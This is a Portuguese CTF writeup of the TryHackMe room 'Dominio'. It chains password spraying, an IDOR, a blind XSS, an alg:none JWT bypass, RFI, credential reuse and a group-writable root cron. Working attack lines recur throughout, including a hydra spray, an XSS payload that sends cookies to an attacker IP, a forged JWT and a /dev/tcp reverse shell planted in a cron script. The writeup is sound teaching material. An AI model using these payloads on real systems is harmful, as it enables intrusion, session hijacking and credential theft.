---
title: 'TryHackMe Dominio — do team.php ao root'
description: 'Writeup da room Dominio: enumeração com feroxbuster, password spraying, IDOR, blind XSS para sequestrar a sessão da admin, bypass de JWT com alg:none, RFI e um cron gravável pelo grupo.'
date: 2026-10-22T19:30:00Z
lang: pt
tags: [tryhackme, writeup, web, privesc, ctf]
draft: false
---

> Writeup da room **Dominio** (TryHackMe): enumeração web, blind XSS, bypass de JWT com `alg:none`,
> RFI e um cron gravável pelo grupo — até o root. _[Read in English](/posts/thm-dominio-en/)._

Esta é uma máquina de encadeamento: cada vulnerabilidade, isolada, é pequena; o estrago mora na
soma. As flags aparecem **redigidas** (`REDACTED`) — o que interessa aqui é a cadeia, não a string
que você cola no site.

A cadeia inteira, em uma frase: enumerar o app → derrubar senhas fracas com spray → colher a primeira
flag com um **IDOR** → usar um **blind XSS** para roubar o cookie da administradora → forjar um **JWT
com `alg:none`** para abusar de uma API de leitura de arquivos → virar isso em **RCE** por RFI →
reusar credencial para andar de lado → e escalar para root por um **cron gravável pelo grupo**.

## Recon: desenhando o app antes de tocar nele

Primeiro mapa do alvo, sem pressa. `/etc/hosts` apontando `dominio.thm` e um
[feroxbuster](https://github.com/epi052/feroxbuster) com a `common.txt` da SecLists:

```console
$ feroxbuster -w ~/Sec/Tools/Wordlists/SecLists/Discovery/Web-Content/common.txt -u 'http://dominio.thm/'
200      GET       28l       62w      861c http://dominio.thm/index.php
200      GET       96l      307w     3747c http://dominio.thm/team.php
301      GET        9l       28w      310c http://dominio.thm/admin => http://dominio.thm/admin/
301      GET        9l       28w      308c http://dominio.thm/api => http://dominio.thm/api/
301      GET        9l       28w      311c http://dominio.thm/backup => http://dominio.thm/backup/
200      GET        1l        2w      194c http://dominio.thm/backup/config.enc
200      GET        4l       17w      191c http://dominio.thm/backup/README.txt
302      GET        0l        0w        0c http://dominio.thm/api/auth/token.php => .../index.php
403      GET        8l       29w      322c http://dominio.thm/admin/index.php
301      GET        9l       28w      312c http://dominio.thm/support => http://dominio.thm/support/
```

Isso já conta uma história: há um **login** (`index.php`), uma vitrine de funcionários
(`team.php`), um `/admin/` que responde **403** (existe, mas não para mim ainda), uma **API** com
emissão de token (`/api/auth/token.php`), um `/support/` e um `/backup/` com _directory listing_
aberto servindo um `config.enc` e um `README.txt`.

O `README.txt` do backup é honesto demais:

```text
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

E o `static/app.js` entrega a chave num comentário — o clássico "segredo no front-end":

```js
// Encryption key for backup config decryption - AES-ECB-128
// Key: N3xusK3y2024!!  (pad to 16 bytes with  )
_backupKey: 'N3xusK3y2024!!',
```

Escrevi um decryptor curtinho (AES-128-ECB, 14 chars de chave + 2 bytes de padding) só para
confirmar o que havia ali dentro:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 14 chars ASCII + 2 bytes de padding = 16. O comentário no JS mostrava um byte
# não renderizado (U+FFFD); padding com null byte é o suspeito de sempre.
KEY = b"N3xusK3y2024!!" + b"\x00" * 2

def decrypt(path):
    data = path.read_bytes()
    plain = AES.new(KEY, AES.MODE_ECB).decrypt(data)
    try:                                   # tenta PKCS7
        return unpad(plain, AES.block_size)
    except ValueError:                     # senão, tira os null bytes do fim
        return plain.rstrip(b"\x00")
```

```console
$ python decrypt-config.py config.enc
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

Honestamente? Um beco quase sem saída. O `config.enc` só confirma a existência do usuário
`devops` — útil para guardar no fundo da cabeça, nada que me dê acesso agora. Mas é o tipo de
detalhe que paga juros lá na frente.

## Enumeração de usuários: a vitrine entrega a folha de pagamento

O `team.php` é uma página de "nosso time" — e, para um atacante, uma lista de usuários com cargo e
e-mail de brinde.

![Página team.php listando os sete funcionários da NexusCorp, com nome, cargo e e-mail](./img/team.png)

O padrão de e-mail (`nome.sobrenome@nexus.corp`) vira padrão de usuário sem esforço:

```text
laura.hayes      # Chief Information Officer  → provável admin
michael.chen     # Lead Security Engineer
sarah.johnson    # Senior Software Engineer
robert.wilson    # DevOps Engineer
emma.taylor      # Product Manager
david.brown      # Full Stack Developer
james.wright     # Systems Administrator
```

Guardei isso em `possible_users.txt`. Reparar que a Laura é CIO já planta uma meta: se um dia eu
precisar de "admin", é a sessão dela que eu quero.

## Password spraying: o hydra faz o trabalho chato

Com sete usuários válidos, um spray com a wordlist de 10k senhas mais comuns da SecLists contra o
`POST /index.php`:

```console
$ hydra -L possible_users.txt \
    -P ~/Sec/Tools/Wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
    dominio.thm http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' -I
[80][http-post-form] host: dominio.thm   login: sarah.johnson   password: password
[80][http-post-form] host: dominio.thm   login: robert.wilson   password: password
[80][http-post-form] host: dominio.thm   login: emma.taylor     password: password
1 of 1 target successfully completed, 7 valid passwords found
```

Três contas com a senha `password`. (O hydra lista os sete logins porque a mensagem de erro muda
quando o usuário existe — enumeração de graça —, mas só três têm senha quebrável.) Entro como
`sarah.johnson`. Sou um usuário comum, e o portal deixa isso bem claro.

## O portal por dentro: um modelo de sessão esquisito

![Dashboard do portal logado como sarah.johnson, com Role: user e os cartões "My Profile", "File Viewer" e "Quick Links"](./img/dashboard.png)

O dashboard tem um cartão **File Viewer** que aponta para o verdadeiro alvo da parte web:
`GET /api/files.php?name=` com autenticação **JWT** via `/api/auth/token.php`. O `app.js` explica o
fluxo: há um cookie `nexus_session` (um JSON em base64 com `user_id`, `username` e `role`, mais uma
assinatura HMAC) e, em paralelo, um JWT guardado no `localStorage`. Dois endpoints dessa API saltam
aos olhos: o **File Viewer** (`files.php`) e o **My Profile API** (`profile.php`), que o dashboard
linka como `?id=<o meu id>`.

## IDOR horizontal: lendo o perfil do admin

O `profile.php` recebe o `id` na query e devolve o perfil correspondente — mas não confere se aquele
`id` é o **meu**. IDOR horizontal de manual. Logado como `sarah` (que é `id=3`), troco o número por
`id=1`:

```console
$ curl -s -b cookies 'http://dominio.thm/api/users/profile.php?id=1'
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin",
 "notes":"THM{REDACTED  ·  idor}"}
```

A `fl4g1` estava nas **notas do perfil** do admin (redigida). E de brinde, a confirmação do que a
`team.php` só insinuava: `laura.hayes` é `id=1` e `role=admin`. Agora não é mais aposta — eu sei
exatamente qual sessão vale a pena roubar.

## O muro do files.php: só com JWT de admin

Testando a API com o token que o próprio `token.php` me dá:

```console
$ curl -s -H "Authorization: Bearer $TOKEN" 'http://dominio.thm/api/files.php?name=teste'
{"error":"Admin JWT required. Check your token payload."}
```

O detalhe que trava tudo: o `token.php` me devolve um JWT com `"role":"user"` — coerente, afinal sou
um usuário comum. Mas o `files.php` exige `"role":"admin"` no payload. Ou seja: preciso de um token
admin que o servidor se recusa a me emitir. Duas saídas óbvias — roubar uma sessão admin de verdade,
ou forjar o token. No fim, usei **as duas**, uma para destravar a outra.

## Blind XSS: deixando a bot admin fazer o login por mim

O `/support/` permite abrir tickets. Um campo de texto livre que alguém "revisa" é praticamente um
convite para **XSS armazenado** — e o nome da flag dessa etapa confirmou a técnica depois.

![Formulário "Open Support Ticket" com os campos Subject e Message](./img/new-ticket.png)

A ideia do blind XSS: eu não vejo o resultado no meu navegador; quem renderiza o meu payload é um
**bot** que roda do outro lado, autenticado. Se esse bot for a Laura (ou rodar com a sessão dela),
o payload executa no contexto dela e eu exfiltro o cookie. Payload no corpo do ticket:

```html
<img src="x" onerror="new Image().src='http://192.168.159.13/c='+document.cookie" />
```

Do meu lado, nada de ferramenta pesada: um servidor HTTP em Python que só loga tudo que chega —
método, path, headers e corpo — e responde `200 OK` pra qualquer método:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")

        print("Headers:")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")

        length = int(self.headers.get("Content-Length", 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body ({length} bytes):")
            print(body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = _log


if __name__ == "__main__":
    port = 80
    print(f"Listening on http://localhost:{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

Abro o ticket, espero o bot "revisar", e o callback chega:

```console
$ sudo python main.py
Listening on http://localhost:80

--- GET /c= ---
Headers:
  Host: 192.168.159.13
  User-Agent: python-requests/2.31.0
  Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==...
10.64.163.38 - - [22/Oct/2026 15:53:49] "GET /c= HTTP/1.1" 200 -
```

Uma sessão caiu na bandeja. O valor é delicioso de decodificar: aquele `eyJ...` antes do ponto é só
base64, e ao abrir mostra de quem é:
`{"user_id": 1, "username": "laura.hayes", "role": "admin"}`. É a sessão da Laura — o mesmo `user_id`
1 que eu já tinha fichado no IDOR. A sessão é um objeto de confiança assinado — mas eu não preciso forjá-lo, eu **roubei o original**. Troco meu cookie pelo
dela e o `/admin/` que me dava 403 agora abre.

![Painel de administração logado como laura.hayes, com a flag redigida](./img/admin-panel.png)

A segunda flag (`fl4g2`), **redigida** acima no cartão "System Status". O painel ainda documenta,
gentilmente, o endpoint do File Viewer: `GET /api/files.php?name=[path] with Bearer token`.

## alg:none: o bypass de JWT mais velho do livro

Essa é a etapa que eu mais gosto. Com a sessão da Laura eu já navegava no painel admin, mas o
`files.php` continuava exigindo um **JWT** com `role:admin` — e aqui veio a surpresa: o `token.php`,
mesmo com a sessão dela, continua me entregando `role:user`. O caminho "limpo" seria descobrir o
`JWT_SECRET` e assinar um token novo. Eu não tinha
o segredo (ele mora no `config.php`, que eu só consigo ler _depois_ de abusar do `files.php` — um
ovo-e-galinha perfeito).

A saída foi mais burra e mais bonita: o ataque clássico do **algoritmo `none`**. Se a verificação
do servidor confia no campo `alg` do header do próprio token, eu troco `HS256` por `none`, removo a
assinatura e declaro `"role":"admin"` à vontade. Montei o token (com a [jwthunter.io](https://jwthunter.io/)
de apoio para visualizar os campos) e mandei ver:

```console
$ curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9." \
    'http://dominio.thm/api/files.php' --data-urlencode 'name=../config.php' -G
{"file":"/var/www/html/config.php","content":"<?php
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
..."}
```

Assinatura vazia, `alg:none`, e o servidor engoliu. Duas ironias: (1) agora eu tenho o `JWT_SECRET`
que eu teria precisado para o caminho "correto" — tarde demais para me importar; (2) tenho o
`DB_PASS` = `D3v0ps!2024`, que vai valer ouro na próxima etapa.

O `name=` do `files.php` tem um checador ingênuo de path ("tem que ficar dentro de `/var/www/html/`")
que peguei com `../config.php` mas que bloqueia `../../../../etc/passwd`. Só que ele também aceita
**URL remota** — RFI:

```console
$ curl ... --data-urlencode 'name=http://192.168.159.13/x' -G
{"error":"Could not fetch remote file"}
```

"Could not fetch" quer dizer que ele _tentou_ buscar. É só servir um PHP malicioso. Subo o
[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) apontando para mim na 4445,
incluo via RFI, e pego o shell. Em vez do `nc` de sempre, usei o
[penelope](https://github.com/brightio/penelope) como handler — PTY decente e log de sessão de
graça:

```console
$ penelope -p 4445
[+] Shell => www-data@tryhackme-2404
www-data@tryhackme-2404:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tryhackme-2404:/$ cat /opt/flag3.txt
THM{REDACTED  ·  foothold}
```

Foothold. Flag de RFI→RCE no bolso (**redigida**).

## Movimento lateral: a credencial que o config.php entregou

`www-data` é um convidado, não o dono da casa. O `config.php` já tinha me dado `D3v0ps!2024`, e a
`team.php` já tinha me dito que existe um `robert.wilson` DevOps e um usuário de sistema `devops`.
Reúso de senha é o pecado capital que nunca sai de moda:

```console
www-data@tryhackme-2404:/$ su devops
Password: D3v0ps!2024
devops@tryhackme-2404:~$ cat user.txt
THM{REDACTED  ·  lateral}
```

Dentro. A flag dessa etapa se chama, literalmente, "reúso de credencial para movimento lateral" —
às vezes o autor da room está só gritando a lição na sua cara.

## Privesc: um cron de root e um grupo com permissão demais

Como `devops`, a pergunta de sempre: o que roda como root e me deixa encostar? Baixei o
[pspy](https://github.com/DominicBreuker/pspy) para espiar processos sem precisar de privilégio:

```console
devops@tryhackme-2404:~$ wget http://192.168.159.13/pspy64 && chmod +x pspy64 && ./pspy64
...
CMD: UID=0  PID=1107  | /usr/bin/python3 /opt/admin_bot.py
CMD: UID=0  PID=606   | /usr/sbin/cron -f -P
```

Um `cron` de root rodando. Seguindo o faro até `/opt/monitoring/`:

```console
devops@tryhackme-2404:/opt/monitoring$ ls -l
-rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
```

Aí está. O script é **de propriedade do root**, mas o grupo é `devops` e tem bit de escrita
(`rwxrwxr--`). Eu _sou_ do grupo `devops`. Um cron de root que executa um arquivo que eu posso
reescrever é game over — basta plantar uma reverse shell dentro dele e esperar o relógio:

```bash
# health_report.sh, agora com um presente no fim
bash -i >& /dev/tcp/192.168.159.13/9001 0>&1
```

Do outro lado, um listener simples (dessa vez o `nc` mesmo, porque é só receber um shell de root e
sair):

```console
$ nc -lvnp 9001
...
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{REDACTED  ·  root}
```

Root. Cinco flags, a máquina inteira.

## O que fica

Nenhuma dessas vulnerabilidades é exótica. O que a room ensina bem é **encadeamento**: cada elo é
pequeno, quase perdoável isolado, e o estrago mora na soma.

- **Segredo no front-end.** A chave do `config.enc` num comentário de JS. Se está no navegador do
  cliente, não é segredo.
- **Senhas fracas + enumeração.** `password` em três contas, e um erro de login que denuncia quem
  existe. Spraying continua pagando as contas.
- **IDOR horizontal.** O `profile.php` confia no `id` da query sem checar a sessão — qualquer usuário
  lê o perfil (e as notas) de qualquer outro.
- **Blind XSS → sequestro de sessão.** Um campo de ticket sem sanitização e um bot autenticado. Eu
  não forjei a confiança da Laura; roubei a sessão inteira dela.
- **`alg:none`.** O bug de JWT mais velho do livro, e ainda vivo. Verifique a assinatura _e_ fixe o
  algoritmo no servidor — nunca confie no `alg` do token.
- **Path check ingênuo + RFI.** Um filtro que pensa em `../` mas esquece de `http://`.
- **Reúso de credencial.** O `DB_PASS` virou a senha do usuário do sistema.
- **Permissão de grupo + cron de root.** `rwxrwxr--` num arquivo que o root executa é, na prática,
  um SUID disfarçado.

A parte que mais me diverte, olhando para trás, é o `alg:none`. O caminho óbvio seria descobrir o
`JWT_SECRET` de outro jeito; eu simplesmente me recusei a provar que conhecia o segredo, e o servidor
topou. É um bom lembrete de que, em segurança, a pergunta certa muitas vezes não é "como eu consigo a
chave?", e sim "será que ele checa se eu tenho uma?".
